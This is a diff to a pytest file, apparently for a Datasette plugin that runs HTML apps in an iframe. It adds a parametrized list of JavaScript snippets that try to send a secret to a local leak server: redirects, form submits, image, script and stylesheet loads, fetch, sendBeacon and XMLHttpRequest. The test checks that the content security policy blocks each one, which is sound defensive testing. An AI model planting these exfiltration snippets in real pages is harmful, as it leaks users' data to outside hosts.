@@ -13,6 +13,7 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 from urllib.request import urlopen
 
+import pytest
 from datasette.app import Datasette
 from playwright.sync_api import sync_playwright
 
@@ -134,14 +135,22 @@ class LeakServer:
         leak_server = self
 
         class Handler(BaseHTTPRequestHandler):
-            def do_GET(self):
+            def _record_and_respond(self):
                 if self.path.startswith("/leak?"):
                     with leak_server._lock:
-                        leak_server.requests.append(self.path)
+                        leak_server.requests.append(
+                            {"method": self.command, "path": self.path}
+                        )
                 self.send_response(200)
                 self.send_header("Content-Type", "text/plain")
                 self.end_headers()
                 self.wfile.write(b"ok")
+
+            def do_GET(self):
+                self._record_and_respond()
+
+            def do_POST(self):
+                self._record_and_respond()
 
             def log_message(self, format, *args):
                 pass
@@ -191,6 +200,109 @@ def _create_content_database(path):
         conn.commit()
     finally:
         conn.close()
+
+
+MALICIOUS_EXFILTRATION_ATTEMPTS = [
+    pytest.param(
+        "window.location.href = LEAK_URL;",
+        id="window-location-href",
+    ),
+    pytest.param(
+        "window.location.assign(LEAK_URL);",
+        id="window-location-assign",
+    ),
+    pytest.param(
+        "window.location.replace(LEAK_URL);",
+        id="window-location-replace",
+    ),
+    pytest.param(
+        """
+const form = document.createElement("form");
+form.method = "GET";
+form.action = LEAK_BASE + "/leak";
+const input = document.createElement("input");
+input.name = "secret";
+input.value = "top-secret";
+form.appendChild(input);
+document.body.appendChild(form);
+form.submit();
+""",
+        id="get-form-submit",
+    ),
+    pytest.param(
+        """
+const form = document.createElement("form");
+form.method = "POST";
+form.action = LEAK_BASE + "/leak?secret=top-secret";
+document.body.appendChild(form);
+form.submit();
+""",
+        id="post-form-submit",
+    ),
+    pytest.param(
+        """
+const img = document.createElement("img");
+img.src = LEAK_URL;
+document.body.appendChild(img);
+""",
+        id="image-src",
+    ),
+    pytest.param(
+        """
+const script = document.createElement("script");
+script.src = LEAK_URL;
+document.body.appendChild(script);
+""",
+        id="script-src",
+    ),
+    pytest.param(
+        """
+const link = document.createElement("link");
+link.rel = "stylesheet";
+link.href = LEAK_URL;
+document.head.appendChild(link);
+""",
+        id="stylesheet-href",
+    ),
+    pytest.param(
+        'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
+        id="fetch-no-cors",
+    ),
+    pytest.param(
+        'navigator.sendBeacon(LEAK_URL, "top-secret");',
+        id="send-beacon",
+    ),
+    pytest.param(
+        """
+const xhr = new XMLHttpRequest();
+xhr.open("GET", LEAK_URL);
+xhr.send();
+""",
+        id="xml-http-request",
+    ),
+]
+
+
+def _malicious_app_html(attempt_script, leak_url, leak_base):
+    return f"""<!doctype html>
+<html>
+<head><title>Exfiltration attempt</title></head>
+<body>
+<p id="status">loaded</p>
+<script>
+const LEAK_URL = {json.dumps(leak_url)};
+const LEAK_BASE = {json.dumps(leak_base)};
+document.getElementById("status").textContent = "attempted";
+setTimeout(function() {{
+  try {{
+{attempt_script}
+  }} catch (error) {{
+    document.getElementById("status").textContent = "attempted with error";
+  }}
+}}, 100);
+</script>
+</body>
+</html>"""
 
 
 def test_datasette_query_bridge_returns_data_to_iframe(tmp_path):
@@ -258,19 +370,16 @@ console.error("Playwright saw this app error");
         )
 
 
-def test_parent_frame_src_csp_blocks_app_iframe_location_exfiltration(tmp_path):
+@pytest.mark.parametrize("attempt_script", MALICIOUS_EXFILTRATION_ATTEMPTS)
+def test_malicious_apps_cannot_exfiltrate_to_external_origin(
+    tmp_path, attempt_script
+):
     with LeakServer() as leak_server:
         server = DatasetteServer(tmp_path)
+        leak_url = leak_server.url + "/leak?secret=top-secret"
         app = asyncio.run(
             server.create_app(
-                f"""<!doctype html>
-<p id="status">loaded</p>
-<script>
-document.getElementById("status").textContent = "attempted";
-setTimeout(function() {{
-  window.location.href = {json.dumps(leak_server.url + "/leak?secret=top-secret")};
-}}, 100);
-</script>""",
+                _malicious_app_html(attempt_script, leak_url, leak_server.url),
                 name="Exfiltration attempt",
             )
         )
